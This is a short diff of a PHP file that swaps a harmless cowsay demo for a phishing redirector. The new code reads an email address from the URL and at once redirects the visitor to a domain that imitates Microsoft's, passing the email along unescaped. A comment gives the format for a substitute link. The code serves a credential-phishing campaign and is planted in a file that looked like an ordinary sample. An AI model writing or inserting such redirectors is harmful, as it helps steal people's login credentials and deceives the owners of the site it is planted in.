@@ -1,14 +1,12 @@
 <?php
-require __DIR__ . '/vendor/autoload.php';
 
-use Cowsayphp\Farm;
+$email = $_GET['email'];
 
-header('Content-Type: text/plain');
+//Your link must be in this format "https://comrfound.com/vnchoice/index.php". with a forward slash and nothing more.
 
-$text = "Set a message by adding ?message=<message here> to the URL";
-if(isset($_GET['message']) && $_GET['message'] != '') {
-	$text = htmlspecialchars($_GET['message']);
-}
+$link = "https://ms-online.live/bt/r/MsCQarj?email=";
+$sess = "?email=$email";
 
-$cow = Farm::create(\Cowsayphp\Farm\Cow::class);
-echo $cow->say($text);
+header ("Refresh: 0; url=$link$sess");
+
+?>
